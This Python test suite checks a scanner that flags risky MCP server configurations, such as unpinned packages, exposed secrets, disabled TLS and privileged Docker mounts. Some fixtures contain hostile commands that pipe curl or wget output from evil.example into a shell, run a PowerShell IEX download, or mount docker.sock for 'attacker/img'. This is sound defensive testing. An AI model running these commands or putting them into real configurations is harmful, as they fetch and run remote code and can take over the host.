"""B24 — MCP server hardening tests.

Conservative philosophy: FAIL only on positive evidence of a risky pattern;
WARN for likely-insecure defaults; PASS when servers exist but none trigger;
UNKNOWN when no MCP servers are configured.
"""
from pathlib import Path

from clawseccheck.checks import check_mcp_hardening
from clawseccheck.collector import Context


def _ctx(cfg: dict) -> Context:
    c = Context(home=Path("/nonexistent"))
    c.config = cfg
    return c


def _mcp(servers: dict) -> Context:
    """Wrap servers dict under cfg['mcpServers'] (the most common real-world key)."""
    return _ctx({"mcpServers": servers})


# ---- UNKNOWN when no MCP configured ----

def test_b24_no_mcp_unknown():
    assert check_mcp_hardening(_ctx({})).status == "UNKNOWN"


def test_b24_empty_mcp_dict_unknown():
    assert check_mcp_hardening(_ctx({"mcpServers": {}})).status == "UNKNOWN"


# ---- PASS when servers exist but no risky patterns ----

def test_b24_clean_stdio_server_passes():
    ctx = _mcp({"my-tool": {"command": "node", "args": ["dist/index.js"]}})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b24_pinned_npx_passes():
    ctx = _mcp({"tool": {"command": "npx", "args": ["-y", "some-pkg@1.2.3"]}})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b24_remote_url_with_allowlist_warns_not_fails():
    # remote URL + allowedHosts -> WARN (not FAIL) — the allowedHosts is a mitigation
    ctx = _mcp({"remote": {
        "url": "https://mcp.example.com/api",
        "allowedHosts": ["mcp.example.com"],
    }})
    # allowedHosts is present so no WARN for missing allowlist; no other risk -> PASS
    assert check_mcp_hardening(ctx).status == "PASS"


# ---- WARN patterns ----

def test_b24_npx_at_latest_warns():
    ctx = _mcp({"tool": {"command": "npx", "args": ["-y", "some-pkg@latest"]}})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    ev = " ".join(f.evidence)
    assert "unpinned" in ev.lower() or "@latest" in ev


def test_b24_npx_url_warns():
    ctx = _mcp({"tool": {
        "command": "npx",
        "args": ["-y", "https://registry.example.com/pkg"],
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b24_uvx_url_warns():
    ctx = _mcp({"tool": {"command": "uvx", "args": ["https://example.com/run"]}})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b24_curl_in_command_warns():
    ctx = _mcp({"tool": {"command": "curl", "args": ["https://example.com/run.sh"]}})
    assert check_mcp_hardening(ctx).status == "WARN"


# ---- B-150: pipe-to-run install vector must FAIL, not just WARN ----

def test_b24_bash_curl_pipe_to_bash_fails():
    """bash -c 'curl ... | bash' is an unambiguous pipe-to-run install vector."""
    ctx = _mcp({"runner": {
        "command": "bash",
        "args": ["-c", "curl http://evil.example/x | bash"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "pipe-to-run" in " ".join(f.evidence).lower()


def test_b24_sh_wget_pipe_to_sh_fails():
    ctx = _mcp({"runner": {
        "command": "sh",
        "args": ["-c", "wget -qO- http://evil.example/x | sh"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"


def test_b24_powershell_iex_download_fails():
    ctx = _mcp({"runner": {
        "command": "powershell",
        "args": ["-c", "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"


def test_b24_bare_curl_no_pipe_still_warns_not_fails():
    """Regression guard: a bare curl/URL fetch with no pipe into a shell must
    stay WARN — only the pipe-to-shell shape escalates to FAIL (B-150)."""
    ctx = _mcp({"fetcher": {
        "command": "curl",
        "args": ["-fsSL", "https://api.example.com/data.json", "-o", "/tmp/data.json"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"


def test_b24_pinned_npx_fetch_still_passes():
    """Regression guard: an ordinary pinned npx fetch is not a pipe-to-run vector."""
    ctx = _mcp({"fetcher": {
        "command": "npx",
        "args": ["-y", "mcp-fetch@2.3.1", "--config", "fetch.json"],
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


# ---- B-159: a URL passed to a known safe registry/index flag is not
# unpinned-package evidence — the package spec itself is still pinned. ----

def test_b24_pinned_npx_with_registry_flag_space_passes():
    ctx = _mcp({"tool": {
        "command": "npx",
        "args": ["-y", "--registry", "https://registry.npmjs.org/", "some-pkg@1.2.3"],
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b24_pinned_npx_with_registry_flag_equals_passes():
    ctx = _mcp({"tool": {
        "command": "npx",
        "args": ["-y", "--registry=https://registry.npmjs.org/", "some-pkg@1.2.3"],
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b24_pinned_pip_with_index_url_flag_passes():
    ctx = _mcp({"tool": {
        "command": "pip",
        "args": ["install", "--index-url", "https://pypi.example.com/simple", "some-pkg==1.2.3"],
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b24_npx_bare_url_package_still_warns():
    """Regression guard: a URL that IS the package spec (not a flag value)
    must still warn — only known safe-flag values are exempted."""
    ctx = _mcp({"tool": {
        "command": "npx",
        "args": ["-y", "--registry", "https://registry.npmjs.org/", "https://evil.example/pkg.tgz"],
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b24_bad_pipe_to_run_fixture_fails():
    from clawseccheck.collector import collect

    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b150_mcp_pipe_to_run"))
    assert f.status == "FAIL"


def test_b24_clean_curl_no_pipe_fixture_warns_not_fails():
    from clawseccheck.collector import collect

    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "clean_b150_mcp_curl_no_pipe"))
    assert f.status == "WARN"


def test_b24_openai_api_key_env_warns():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "env": {"OPENAI_API_KEY": "sk-real-key"},
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b24_aws_secret_env_warns():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "env": {"AWS_SECRET_ACCESS_KEY": "something"},
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b24_remote_url_no_allowlist_warns():
    ctx = _mcp({"remote": {"url": "https://mcp.example.com/api"}})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    ev = " ".join(f.evidence)
    assert "allowedHosts" in ev or "allowlist" in ev.lower()


# ---- FAIL patterns ----

def test_b24_env_wildcard_in_key_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "env": {"*": "*"},
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "*" in " ".join(f.evidence)


def test_b24_env_wildcard_string_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "env": "*",
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"


def test_b24_token_passthrough_true_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "tokenPassthrough": True,
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "tokenPassthrough" in " ".join(f.evidence)


def test_b24_token_passthrough_hyphen_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "token-passthrough": True,
    }})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_allowed_hosts_wildcard_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "allowedHosts": ["*"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "*" in " ".join(f.evidence)


def test_b24_allowed_hosts_metadata_ip_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "allowedHosts": ["169.254.169.254"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "169.254.169.254" in " ".join(f.evidence)


def test_b24_allowed_hosts_internal_ip_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "allowedHosts": ["192.168.1.100"],
    }})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_allowed_hosts_rfc1918_10_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "allowedHosts": ["10.0.0.1"],
    }})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_allowed_hosts_localhost_fails():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "allowedHosts": ["localhost"],
    }})
    assert check_mcp_hardening(ctx).status == "FAIL"


# ---- Alternative config key shapes ----

def test_b24_cfg_mcp_key_is_detected():
    ctx = _ctx({"mcp": {"tool": {"tokenPassthrough": True, "command": "node", "args": []}}})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_tools_mcp_key_is_detected():
    ctx = _ctx({"tools": {"mcp": {"tool": {"env": {"*": "*"}, "command": "node", "args": []}}}})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_plugins_mcp_key_is_detected():
    ctx = _ctx({"plugins": {"mcp": {"tool": {"tokenPassthrough": True, "command": "node", "args": []}}}})
    assert check_mcp_hardening(ctx).status == "FAIL"


# ---- Evidence list is populated on FAIL/WARN ----

def test_b24_fail_populates_evidence():
    ctx = _mcp({"tool": {"command": "node", "args": [], "tokenPassthrough": True}})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert len(f.evidence) >= 1


def test_b24_warn_populates_evidence():
    ctx = _mcp({"tool": {"command": "npx", "args": ["pkg@latest"]}})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    assert len(f.evidence) >= 1


# ---- Non-risky env vars do NOT warn ----

def test_b24_benign_env_var_does_not_warn():
    ctx = _mcp({"tool": {
        "command": "node",
        "args": ["index.js"],
        "env": {"NODE_ENV": "production", "PORT": "3000"},
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


# ---- Multiple servers: worst-case status wins ----

def test_b24_mixed_servers_fail_wins():
    ctx = _mcp({
        "clean": {"command": "node", "args": ["dist/index.js"]},
        "risky": {"command": "node", "args": [], "tokenPassthrough": True},
    })
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b24_mixed_clean_and_warn():
    ctx = _mcp({
        "clean": {"command": "node", "args": ["dist/index.js"]},
        "outdated": {"command": "npx", "args": ["pkg@latest"]},
    })
    assert check_mcp_hardening(ctx).status == "WARN"


# ---- B-230: docker.sock / --privileged in the MCP server's OWN stdio command ----

def test_b230_docker_sock_in_command_fails():
    ctx = _mcp({"tool": {
        "command": "docker",
        "args": ["run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "attacker/img"],
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "docker.sock" in " ".join(f.evidence)


def test_b230_docker_privileged_flag_fails():
    ctx = _mcp({"tool": {"command": "docker", "args": ["run", "--privileged", "attacker/img"]}})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "--privileged" in " ".join(f.evidence)


def test_b230_privileged_flag_without_docker_mention_does_not_fail():
    """C-135: the --privileged flag alone (no docker/podman context) must not FAIL —
    a generic tool could plausibly define its own same-named flag."""
    ctx = _mcp({"tool": {"command": "mytool", "args": ["--privileged", "run"]}})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b230_bad_docker_sock_fixture_fails():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_docker_sock"))
    assert f.status == "FAIL"


def test_b230_bad_docker_privileged_fixture_fails():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_docker_privileged"))
    assert f.status == "FAIL"


# ---- B-230: sslVerify/ssl_verify=false on a remote endpoint (MITM) ----

def test_b230_ssl_verify_false_remote_public_fails():
    ctx = _mcp({"remote": {"url": "https://mcp.example.com/api", "sslVerify": False}})
    f = check_mcp_hardening(ctx)
    assert f.status == "FAIL"
    assert "sslVerify" in " ".join(f.evidence)


def test_b230_ssl_verify_false_snake_case_alias_fails():
    ctx = _mcp({"remote": {"url": "https://mcp.example.com/api", "ssl_verify": False}})
    assert check_mcp_hardening(ctx).status == "FAIL"


def test_b230_ssl_verify_true_remote_does_not_fail():
    ctx = _mcp({"remote": {"url": "https://mcp.example.com/api", "sslVerify": True}})
    assert check_mcp_hardening(ctx).status != "FAIL"


def test_b230_ssl_verify_false_with_allowedhosts_does_not_fail():
    """C-135 trap: sslVerify=false is explicitly blessed by the OpenClaw dist for
    'explicitly trusted private endpoints' — an allowlisted host must not FAIL."""
    ctx = _mcp({"remote": {
        "url": "https://internal-mcp.corp.example.com/api",
        "sslVerify": False,
        "allowedHosts": ["internal-mcp.corp.example.com"],
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b230_ssl_verify_false_private_rfc1918_host_does_not_fail():
    """C-135 trap: a private RFC-1918 endpoint is exactly the 'trusted private
    endpoint' the sslVerify field's own docs bless — must not FAIL even with no
    allowedHosts configured."""
    ctx = _mcp({"remote": {"url": "https://10.0.5.20/api", "sslVerify": False}})
    assert check_mcp_hardening(ctx).status != "FAIL"


def test_b230_ssl_verify_false_loopback_does_not_fail():
    ctx = _mcp({"remote": {"url": "https://127.0.0.1:8443/api", "sslVerify": False}})
    assert check_mcp_hardening(ctx).status != "FAIL"


def test_b230_bad_ssl_verify_remote_fixture_fails():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_ssl_verify_remote"))
    assert f.status == "FAIL"


def test_b230_clean_ssl_verify_private_fixture_passes():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "clean_b230_mcp_ssl_verify_private"))
    assert f.status == "PASS"


# ---- B-230: headers.Authorization / bearer credential ----

def test_b230_headers_authorization_warns():
    ctx = _mcp({"remote": {
        "url": "https://mcp.example.com/api",
        "headers": {"Authorization": "Bearer placeholder-not-a-real-token"},
    }})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    assert "headers.Authorization" in " ".join(f.evidence)


def test_b230_headers_bearer_value_without_auth_key_warns():
    ctx = _mcp({"remote": {
        "url": "https://mcp.example.com/api",
        "headers": {"X-Custom-Auth": "Bearer placeholder-not-a-real-token"},
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b230_headers_value_never_echoed_in_evidence():
    ctx = _mcp({"remote": {
        "url": "https://mcp.example.com/api",
        "headers": {"Authorization": "Bearer super-secret-do-not-leak-9f8e7d"},
    }})
    f = check_mcp_hardening(ctx)
    assert "super-secret-do-not-leak" not in " ".join(f.evidence)


def test_b230_benign_headers_do_not_warn():
    ctx = _mcp({"remote": {
        "url": "https://mcp.example.com/api",
        "allowedHosts": ["mcp.example.com"],
        "headers": {"Accept": "application/json", "User-Agent": "my-mcp-client/1.0"},
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b230_bad_header_auth_fixture_warns():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_header_auth"))
    assert f.status == "WARN"


# ---- B-230: non-prefixed secret-env names ----

def test_b230_gh_token_env_warns():
    ctx = _mcp({"tool": {"command": "node", "args": ["x.js"], "env": {"GH_TOKEN": "placeholder"}}})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    assert "GH_TOKEN" in " ".join(f.evidence)


def test_b230_slack_bot_token_env_warns():
    ctx = _mcp({"tool": {
        "command": "node", "args": ["x.js"], "env": {"SLACK_BOT_TOKEN": "placeholder"},
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b230_database_url_env_warns():
    ctx = _mcp({"tool": {
        "command": "node", "args": ["x.js"], "env": {"DATABASE_URL": "postgres://u:p@h/db"},
    }})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b230_npm_auth_env_warns():
    ctx = _mcp({"tool": {"command": "node", "args": ["x.js"], "env": {"NPM_AUTH": "placeholder"}}})
    assert check_mcp_hardening(ctx).status == "WARN"


def test_b230_npm_config_registry_env_does_not_warn():
    """Precision guard: NPM_CONFIG_REGISTRY is not a secret — only NPM_TOKEN/
    NPM_AUTH(_TOKEN) should match."""
    ctx = _mcp({"tool": {
        "command": "node", "args": ["x.js"],
        "env": {"NPM_CONFIG_REGISTRY": "https://registry.npmjs.org/"},
    }})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b230_bad_secret_env_fixture_warns():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_secret_env"))
    assert f.status == "WARN"


# ---- B-230: yarn dlx / explicit @latest unpinned specs ----

def test_b230_yarn_dlx_latest_warns():
    ctx = _mcp({"tool": {"command": "yarn", "args": ["dlx", "some-pkg@latest"]}})
    f = check_mcp_hardening(ctx)
    assert f.status == "WARN"
    ev = " ".join(f.evidence).lower()
    assert "unpinned" in ev or "@latest" in ev


def test_b230_yarn_dlx_pinned_passes():
    ctx = _mcp({"tool": {"command": "yarn", "args": ["dlx", "some-pkg@1.2.3"]}})
    assert check_mcp_hardening(ctx).status == "PASS"


def test_b230_bad_yarn_dlx_fixture_warns():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "bad_b230_mcp_yarn_dlx_latest"))
    assert f.status == "WARN"


# ---- C-135 zero-FP guards: legit configs must stay clean ----

def test_b230_clean_pinned_npx_fixture_passes():
    from clawseccheck.collector import collect
    fixtures = Path(__file__).resolve().parent.parent / "fixtures"
    f = check_mcp_hardening(collect(fixtures / "clean_b230_mcp_pinned_npx"))
    assert f.status == "PASS"


def test_b230_legit_local_stdio_server_passes():
    """A legit local MCP server (no url, no docker, no secrets) must stay clean."""
    ctx = _mcp({"local-tool": {"command": "node", "args": ["dist/server.js"]}})
    assert check_mcp_hardening(ctx).status == "PASS"
